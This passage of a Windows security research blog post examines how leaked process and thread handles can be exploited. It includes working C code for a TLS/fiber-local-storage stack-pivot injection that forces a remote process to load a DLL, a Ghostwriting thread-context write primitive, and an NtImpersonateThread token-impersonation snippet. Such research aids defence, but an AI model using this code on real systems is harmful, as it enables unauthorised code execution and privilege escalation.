<code>kernelbase!SwitchToFiberContext</code> (or <code>kernel32!SwitchToFiber</code> on Windows 7):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
</span><span class='line'>7603c41b c20400          ret     4</span></code></pre></td></tr></table></div></figure>


<p>Putting this all together, execution results in:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
</span><span class='line'>eip=7603c415 esp=0019fd6c ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class='line'>kernel32!SwitchToFiber+0x115:
</span><span class='line'>7603c415 8ba1d8000000    mov     esp,dword ptr [ecx+0D8h]
</span><span class='line'>ds:0023:7ffdee2c=7ffdee30
</span><span class='line'>0:000&gt; p
</span><span class='line'>eax=7603c415 ebx=7ffdf000 ecx=7ffded54 edx=00280bc9 esi=00000001 edi=7ffdee28
</span><span class='line'>eip=7603c41b esp=7ffdee30 ebp=0019fd84 iopl=0         nv up ei pl nz na po nc
</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
</span><span class='line'>kernel32!SwitchToFiber+0x11b:
</span><span class='line'>7603c41b c20400          ret     4
</span><span class='line'>0:000&gt; dd esp l3
</span><span class='line'>7ffdee30  41414141 41414141 41414141</span></code></pre></td></tr></table></div></figure>


<p>Now we&rsquo;ve got EIP and a stack pivot. Instead of marking memory and executing
some other payload, I took a quick and lazy strategy and simply called
<code>LoadLibraryA</code> to load a DLL off disk from an arbitrary location. This works
well, is reliable, and even on process exit will execute and block, depending
on what you do within the DLL. Here&rsquo;s the final code to achieve all this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_NtWriteVirtualMemory NtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll"), "NtWriteVirtualMemory");
</span><span class='line'>
</span><span class='line'>LPVOID lpBuf = malloc(13*sizeof(SIZE_T));
</span><span class='line'>HANDLE hProcess = OpenProcess(PROCESS_VM_WRITE|PROCESS_QUERY_INFORMATION, FALSE, dwTargetPid);
</span><span class='line'>if (hProcess == NULL)
</span><span class='line'>    return;
</span><span class='line'>
</span><span class='line'>SIZE_T LoadLibA = (SIZE_T)LoadLibraryA;
</span><span class='line'>SIZE_T RemoteTeb = GetRemoteTeb(hProcess), TlsAddr = 0;
</span><span class='line'>TlsAddr = RemoteTeb + 0xe10;
</span><span class='line'>
</span><span class='line'>SIZE_T RemotePeb = GetRemotePeb(hProcess);
</span><span class='line'>SIZE_T PivotGadget = 0x7603c415;
</span><span class='line'>SIZE_T StackAddress = (TlsAddr + 28) - 0xd8;
</span><span class='line'>SIZE_T RtlExitThread = (SIZE_T)GetProcAddress(GetModuleHandleA("ntdll"), "RtlExitUserThread");
</span><span class='line'>SIZE_T LoadLibParam = (SIZE_T)TlsAddr + 48;
</span><span class='line'>
</span><span class='line'>//
</span><span class='line'>// construct our TlsSlots payload:
</span><span class='line'>// 0  ] 00000000 00000000 [STACK PIVOT] 00000000
</span><span class='line'>// 16 ] 00000000 00000000 [ECX VALUE] [NEW STACK PTR]
</span><span class='line'>// 32 ] [LOADLIB ADDR] 41414141 [RET ADDR] [LOADLIB ARG PTR]
</span><span class='line'>// 48 ] 41414141
</span><span class='line'>//
</span><span class='line'>
</span><span class='line'>memset(lpBuf, 0x0, 16);
</span><span class='line'>*((DWORD*)lpBuf + 2) = PivotGadget;
</span><span class='line'>*((DWORD*)lpBuf+ 4) = 0;
</span><span class='line'>*((DWORD*)lpBuf + 5) = 0;
</span><span class='line'>*((DWORD*)lpBuf + 6) = StackAddress;
</span><span class='line'>
</span><span class='line'>StackAddress = TlsAddr + 32;
</span><span class='line'>*((DWORD*)lpBuf + 7) = StackAddress;
</span><span class='line'>*((DWORD*)lpBuf + 8) = LoadLibA;
</span><span class='line'>*((DWORD*)lpBuf + 9) = 0x41414141; // junk
</span><span class='line'>*((DWORD*)lpBuf + 10) = RtlExitThread;
</span><span class='line'>*((DWORD*)lpBuf + 11) = (SIZE_T)TlsAddr + 48;
</span><span class='line'>*((DWORD*)lpBuf + 12) = 0x41414141; // DLL name (AAAA.dll)
</span><span class='line'>
</span><span class='line'>NtWriteVirtualMemory(hProcess, (PVOID)TlsAddr, lpBuf, (13 * sizeof(SIZE_T)), NULL);
</span><span class='line'>
</span><span class='line'>// update FlsCallback in PEB and FlsData in TEB
</span><span class='line'>StackAddress = TlsAddr + 12;
</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemoteTeb + 0xfb4), (PVOID)&StackAddress, sizeof(SIZE_T), NULL);
</span><span class='line'>NtWriteVirtualMemory(hProcess, (LPVOID)(RemotePeb + 0x20c), (PVOID)&TlsAddr, sizeof(SIZE_T), NULL);</span></code></pre></td></tr></table></div></figure>


<p>If all works well you should see attempts to load <code>AAAA.dll</code> off disk when the
callback is executed (just close the process). As a note, we&rsquo;re using
<code>NtWriteVirtualMemory</code> here because <code>WriteProcessMemory</code> requires
<code>PROCESS_VM_OPERATION</code> which we may not have.</p>

<p>Another variation of this access might be <code>PROCESS_VM_WRITE|PROCESS_VM_READ</code>.
This gives us visibility into the address space, but we still cannot allocate
or map memory into the remote process. Using the above strategy we can rid
ourselves of the <code>PROCESS_QUERY_INFORMATION</code> requirement and simply read the
PEB address out of TEB.</p>

<p>Finally, consider <code>PROCESS_VM_WRITE|PROCESS_VM_READ|PROCESS_VM_OPERATION</code>.
Granting us <code>PROCESS_VM_OPERATION</code> loosens the restrictions quite a bit, as we
can now allocate memory and change page permissions. This allows us to more
easily use the above strategy, but also perform inline and IAT hooks.</p>

<h2>Thread</h2>

<p>As with the process handles, there are a handful of access rights we can dismiss
immediately:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>SYNCHRONIZE
</span><span class='line'>THREAD_QUERY_INFORMATION
</span><span class='line'>THREAD_GET_CONTEXT
</span><span class='line'>THREAD_QUERY_LIMITED_INFORMATION
</span><span class='line'>THREAD_SUSPEND_RESUME
</span><span class='line'>THREAD_TERMINATE</span></code></pre></td></tr></table></div></figure>


<p>Which leaves the following:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
</span><span class='line'>THREAD_DIRECT_IMPERSONATION
</span><span class='line'>THREAD_IMPERSONATE
</span><span class='line'>THREAD_SET_CONTEXT
</span><span class='line'>THREAD_SET_INFORMATION
</span><span class='line'>THREAD_SET_LIMITED_INFORMATION
</span><span class='line'>THREAD_SET_THREAD_TOKEN</span></code></pre></td></tr></table></div></figure>


<h3>THREAD_ALL_ACCESS</h3>

<p>There&rsquo;s quite a lot we can do with this, including everything described in the
following thread access rights sections. I personally find the
<code>THREAD_DIRECT_IMPERSONATION</code> strategy to be the easiest.</p>

<p>There is another option that is a bit more arcane, but equally viable. Note
that this thread access doesn&rsquo;t give us VM read/write privileges, so there&rsquo;s
no easy to way to &ldquo;write&rdquo; into a thread, since that doesn&rsquo;t really make sense.
What we do have, however, is a series of APIs that sort of grant us that:
<code>SetThreadContext</code>[4] and <code>GetThreadContext</code>[5]. About a decade ago a code
injection technique dubbed Ghostwriting[6] was released to little fanfare. In
it, the author describes a code injection strategy that does not require the
typical win32 API calls; there&rsquo;s no WriteProcessMemory, NtMapViewOfSection, or
even OpenProcess.</p>

<p>While the write-up is lacking in a few departments, it&rsquo;s quite a clever bit of
code. In short, the author abuses the <code>SetThreadContext</code>/<code>GetThreadContext</code>
calls in tandem with a set of specific assembly gadgets to write a payload,
dword by dword, onto the threads stack. Once written, they use
<code>NtProtectVirtualMemoryAddress</code> to mark the code RWX and redirect code flow to
their payload.</p>

<p>For their write gadget, they hunt for a pattern inside NTDLL:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>MOV [REG1], REG2
</span><span class='line'>RET</span></code></pre></td></tr></table></div></figure>


<p>They then locate a <code>JMP $</code>, or jump here, which will operate as an auto lock
and infinitely loop. Once we&rsquo;ve found our two gadgets, we suspend the thread.
We update its RIP to point to the MOV gadget, set our REG1 to an adjusted RSP
so the return address is the <code>JMP $</code>, and set REG2 to the jump gadget. Here&rsquo;s
my write function:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void WriteQword(CONTEXT context, HANDLE hThread, size_t WriteWhat, size_t WriteWhere)
</span><span class='line'>{
</span><span class='line'>    SetContextRegister(&context, g_rside, WriteWhat);
</span><span class='line'>    SetContextRegister(&context, g_lside, WriteWhere);
</span><span class='line'>
</span><span class='line'>    context.Rsp = StackBase;
</span><span class='line'>    context.Rip = MovAddr;
</span><span class='line'>
</span><span class='line'>    WaitForThreadAutoLock(hThread, &context, JmpAddr);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>The <code>SetContextRegister</code> call simply assigns REG1 and REG2 in our gadget to the
appropriate registers. Once those are set, we set our stack base (adjusted from
threads RSP) and update RIP to our gadget. The first time we execute this we&rsquo;ll
write our <code>JMP $</code> gadget to the stack.</p>

<p>They use what they call a thread auto lock to control execution flow (edits
mine):</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>void WaitForThreadAutoLock(HANDLE Thread, CONTEXT* PThreadContext,HWND ThreadsWindow,DWORD AutoLockTargetEIP)
</span><span class='line'>{
</span><span class='line'>    SetThreadContext(Thread,PThreadContext);
</span><span class='line'>
</span><span class='line'>    do
</span><span class='line'>    {
</span><span class='line'>        ResumeThread(Thread);
</span><span class='line'>        Sleep(30); 
</span><span class='line'>        SuspendThread(Thread);
</span><span class='line'>        GetThreadContext(Thread,PThreadContext);
</span><span class='line'>    }
</span><span class='line'>    while(PThreadContext-&gt;Eip!=AutoLockTargetEIP);
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s really just a dumb waiter that allows the thread to execute a little bit
each run before checking if the &ldquo;sink&rdquo; gadget has been reached.</p>

<p>Once our execution hits the jump, we have our write primitive. We can now
simply adjust RIP back to the MOV gadget, update RSP, and set REG1 and REG2 to
any values we want.</p>

<p>I ported the core function of this technique to x64 to demonstrate its
viability. Instead of using it to execute an entire payload, I simply execute
<code>LoadLibraryA</code> to load in an arbitrary DLL at an arbitrary path. The code is
available on Github[11]. Turning it into something production ready is left as
an exercise for the reader ;)</p>

<p>Additionally, while attending Blackhat 2019, I saw a process injection talk by
the SafeBreach Labs group. They&rsquo;ve release a code injection tool that contains
an x64 implementation of GhostWriting[10]. While I haven&rsquo;t personally evaluated
it, it&rsquo;s probably more production ready and usable than mine.</p>

<h3>THREAD_DIRECT_IMPERSONATION</h3>

<p>This differs from <code>THREAD_IMPERSONATE</code> in that it allows the thread token to be
impersonated, not simply TO impersonate. Exploiting this is simply a matter of
using the <code>NtImpersonateThread</code>[8] API, as pointed out by James Forshaw[0][7].
Using this we&rsquo;re able to create a thread totally under our control and
impersonate the privileged one:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hNewThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpRtl, 0, CREATE_SUSPENDED, &dwTid);
</span><span class='line'>NtImpersonateThread(hNewThread, hThread, &sqos);</span></code></pre></td></tr></table></div></figure>


<p>The <code>hNewThread</code> will now be executing with a SYSTEM token, allowing us to do
whatever we need under the privileged impersonation context.</p>

<h3>THREAD_IMPERSONATE</h3>

<p>Unfortunately I was unable to identify a surefire, generic method for
exploiting this one. We have no ability to query the remote thread, nor can we
gain any control over its execution flow. We&rsquo;re simply allowed to manage its
impersonation state.</p>

<p>We can use this to force the privileged thread to impersonate us, using the
<code>NtImpersonateThread</code> call, which may unlock additional logic bugs in the
application. For example, if the service were to create shared resources under
a user context for which it would typically be SYSTEM, such as a file, we can
gain ownership over that file. If multiple privileged threads access it for
information (such as configuration) it could lead to code execution.</p>

<h3>THREAD_SET_CONTEXT</h3>

<p>While this right grants us access to <code>SetThreadContext</code>, it also conveniently
allows us to use <code>QueueUserAPC</code>. This is effectively granting us a
<code>CreateRemoteThread</code> primitive with caveat. For an APC to be processed by the
thread, it needs to enter an alertable state. This happens when a specific set
of win32 functions are executed, so it is entirely possible that the thread
never becomes alertable.</p>

<p>If we&rsquo;re working with an uncooperative thread, <code>SetThreadContext</code> comes in
handy. Using it, we can force the thread to become alertable via the
<code>NtTestAlert</code> function. Of course, we have no ability to call
<code>GetThreadContext</code> and will therefore likely lose control of the thread after
exploitation.</p>

<p>In combination with <code>THREAD_GET_CONTEXT</code>, this right would allow us to
replicate the Ghostwriting code injection technique discussed in the
<code>THREAD_ALL_ACCESS</code> section above.</p>

<h3>THREAD_SET_INFORMATION</h3>

<p>Needed to set various ThreadInformationClass[9] values on a thread, usually via
<code>NtSetInformationThread</code>. After looking through all of these, I did not
identify any immediate ways in which we could influence the remote thread. Some
of the values are interesting but unusuable (<code>ThreadSetTlsArrayAddress</code>,
<code>ThreadAttachContainer</code>, etc) and are either not implemented/removed or
require <code>SeDebugPrivilege</code> or similar.</p>

<p>I&rsquo;m not really sure what would make this a viable candidate either. There&rsquo;s
really not a lot of juicy stuff that can be done via the available functions</p>

<h3>THREAD_SET_LIMITED_INFORMATION</h3>

<p>This allows the caller to set a subset of <code>THREAD_INFORMATION_CLASS</code> values,
namely: <code>ThreadPriority</code>, <code>ThreadPriorityBoost</code>, <code>ThreadAffinityMask</code>,
<code>ThreadSelectedCpuSets</code>, and <code>ThreadNameInformation</code>. None of these get us
anywhere near an exploitable primitive.</p>

<h3>THREAD_SET_THREAD_TOKEN</h3>

<p>Similar to <code>THREAD_IMPERSONATE</code>, I was unable to find a direct and generic
method of abusing this right. I can set the thread&rsquo;s token or modify a few
fields (via <code>SetTokenInformation</code>), but this doesn&rsquo;t grant us much.</p>

<h2>Conclusion</h2>

<p>I was a little disappointed in how uneventful thread rights seemed to be.
Almost half of them proved to be unexploitable on their own, and even in
combination did not turn much up. As per above, having one of the following
three privileges is necessary to turn a leaked thread handle into something
exploitable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>THREAD_ALL_ACCESS
</span><span class='line'>THREAD_DIRECT_IMPERSONATION
</span><span class='line'>THREAD_SET_CONTEXT</span></code></pre></td></tr></table></div></figure>


<p>Missing these will require a deeper understanding of your target and some
creativity.</p>

<p>Similarly, processes have a specific subset of rights that are directly
exploitable:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PROCESS_ALL_ACCESS
</span><span class='line'>PROCESS_CREATE_PROCESS
</span><span class='line'>PROCESS_CREATE_THREAD
</span><span class='line'>PROCESS_DUP_HANDLE
</span><span class='line'>PROCESS_VM_WRITE</span></code></pre></td></tr></table></div></figure>


<p>Barring these, more creativity is required.</p>

<h2>References</h2>

<p>[0]<a href="https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html">https://googleprojectzero.blogspot.com/2016/03/exploiting-leaked-thread-handle.html</a> <br/>
[1]<a href="https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html">https://googleprojectzero.blogspot.com/2018/05/bypassing-mitigations-by-attacking-jit.html</a> <br/>
[2]<a href="https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/">https://d4stiny.github.io/Local-Privilege-Escalation-on-most-Dell-computers/</a> <br/>
[3]<a href="https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights">https://docs.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights</a> <br/>
[4]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext</a> <br/>
[5]<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext</a> <br/>
[6]<a href="http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/">http://blog.txipinet.com/2007/04/05/69-a-paradox-writing-to-another-process-without-openning-it-nor-actually-writing-to-it/</a> <br/>
[7]<a href="https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html">https://tyranidslair.blogspot.com/2017/08/the-art-of-becoming-trustedinstaller.html</a> <br/>
[8]<a href="https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html">https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtImpersonateThread.html</a> <br/>
[9]<a href="https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51">https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools/blob/master/NtApiDotNet/NtThreadNative.cs#L51</a> <br/>
[10]<a href="https://github.com/SafeBreach-Labs/pinjectra">https://github.com/SafeBreach-Labs/pinjectra</a> <br/>
[11]<a href="https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079">https://gist.github.com/hatRiot/aa77f007601be75684b95fe7ba978079</a> <br/>
[12]<a href="http://www.hexacorn.com/blog/category/code-injection/">http://www.hexacorn.com/blog/category/code-injection/</a> <br/>
[13]<a href="http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">http://hatriot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage</a> <br/>
[14]<a href="http://www.nynaeve.net/?p=180">http://www.nynaeve.net/?p=180</a> <br/>
[15]<a href="https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98">https://github.com/processhacker/processhacker/blob/master/phnt/include/ntpsapi.h#L98</a></p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>

      








  


<time datetime="2019-08-22T14:10:04-07:00" pubdate data-updated="true">Aug 22<span>nd</span>, 2019</time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/exploit/'>exploit</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/" data-via="" data-counturl="http://hatRiot.github.io/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2019/08/12/code-execution-via-fiber-local-storage/" title="Previous Post: Code Execution via Fiber Local Storage">&laquo; Code Execution via Fiber Local Storage</a>
      
      
        <a class="basic-alignment right" href="/blog/2020/08/07/digging-the-adobe-sandbox-internals/" title="Next Post: Digging the Adobe Sandbox - IPC Internals">Digging the Adobe Sandbox - IPC Internals &raquo;</a>
      
    </p>
  </footer>
</article>


</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2020/08/07/digging-the-adobe-sandbox-internals/">Digging the Adobe Sandbox - IPC Internals</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a>
      </li>
    
      <li class="post">
        <a href="/blog/2019/08/12/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/08/22/dell-digital-delivery-eop/">Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</a>
      </li>
    
      <li class="post">
        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2020 - Bryan Alexander -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
</p>

</footer>
  










  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
